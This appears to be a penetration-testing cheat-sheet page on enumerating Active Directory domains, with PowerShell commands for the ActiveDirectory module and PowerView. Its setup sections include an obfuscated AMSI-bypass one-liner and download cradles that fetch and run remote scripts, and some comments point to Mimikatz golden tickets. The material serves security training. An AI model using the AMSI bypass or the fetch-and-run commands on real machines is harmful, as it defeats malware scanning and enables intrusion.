---
title: "Domains"
description: "Enumerating domains."
lead: "Enumerating information about domains using the ActiveDirectory PowerShell module and PowerView."
date: 2021-11-07T17:46:09+01:00
lastmod: 2021-11-07T17:46:09+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "domain_enumeration"
weight: 5
toc: true
---

## ActiveDirectory Module

### Setup

```powershell
# If computer has internet access
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory

# If computer has no internet access, download repository
Import-Module .\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose
Import-Module .\ADModule\ActiveDirectory\ActiveDirectory.psd1

# Check if module has been imported correctly
Get-Command -Module ActiveDirectory
```

### Get current Domain

```powershell
Get-ADDomain
```

### Get Object of another Domain

```powershell
Get-ADDomain -Identity lab.local
```

### Get Domain SID for current Domain

```powershell
(Get-ADDomain).DomainSID
```

### Get Domain Controllers for current Domain

```powershell
Get-ADDomainController
```

### Get Domain Controllers for another Domain

```powershell
Get-ADDomainController -DomainName lab.local -Discover
```

## PowerView

### Setup

```powershell
# If it gets blocked by AMSI we can bypass it with
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# Then load the module
Import-Module .\PowerView.ps1
. .\PowerView.ps1

# With internet access
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')
```

### Get current Domain

```powershell
Get-NetDomain
```

### Get Object of another Domain

```powershell
Get-NetDomain -Domain lab.local
```

### Get Domain SID for current Domain

```powershell
Get-DomainSID
```

### Get Domain Policy for current Domain

```powershell
Get-DomainPolicy
(Get-DomainPolicy)."System Access"
```

### Get Password Policy for another Domain

```powershell
(Get-DomainPolicy -Domain lab.local)."System Access"
```

### Get Kerberos Policy for e.g. Mimikatz Golden Tickets

```powershell
(Get-DomainPolicy -Domain lab.local)."Kerberos Policy"
```

### Get Domain Controllers for current Domain

```powershell
Get-NetDomainController
```

### Get Domain Controllers for another Domain

```powershell
Get-NetDomainController -Domain lab.local
```

### Enumerate all Gobal Catalogs in the Forest

```powershell
Get-ForestGlobalCatalog
```

### Turn a List of Computer Short Names to FQDNs, using a Global Catalog

```powershell
gc computers.txt | % {Get-DomainComputer -SearchBase "GC://GLOBAL.CATALOG" -LDAP "(name=$_)" -Properties dnshostname}
```

### Enumerate the current Domain Controller Policy

```powershell
$DCPolicy = Get-DomainPolicy -Policy DC
$DCPolicy.PrivilegeRights # user privilege rights on the dc...
```

### Enumerate the current Domain Policy

```powershell
$DomainPolicy = Get-DomainPolicy -Domain bufu-sec.local
$DomainPolicy.KerberosPolicy # useful for golden tickets ;)
$DomainPolicy.SystemAccess # password age/etc.
```
